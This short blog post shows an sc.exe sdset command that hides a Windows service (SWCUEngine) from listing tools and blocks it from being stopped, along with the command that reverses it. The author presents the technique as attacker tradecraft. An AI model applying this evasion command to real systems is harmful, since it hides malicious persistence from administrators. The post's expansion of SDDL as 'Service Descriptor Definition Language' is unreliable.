---
layout: post
title: Hiding Windows Services From View
---

Some time last year (2020), I came across an interesting technique that allows an attacker to hide a Windows Service from view. Initially, I thought this technique would *only* hide the service from being viewed through commands like sc query, Get-Service or through the Task Manager. However, this is not the case. The hidden service also cannot be stopped until this technique is reversed and the service is made visible again.

-----

## Hiding a Service

> sc.exe sdset SWCUEngine "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"

The command itself is fairly simple, albeit difficult to understand at a glance. Essentially, by making use of SDDL (Service Descriptor Definition Language), an attacker can control a service's permissions and deny Interactive Users certain permissions.

To make the service visible again: 
> sc.exe sdset SWCUEngine "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"

[More Reading](https://www.sans.org/blog/red-team-tactics-hiding-windows-services/)
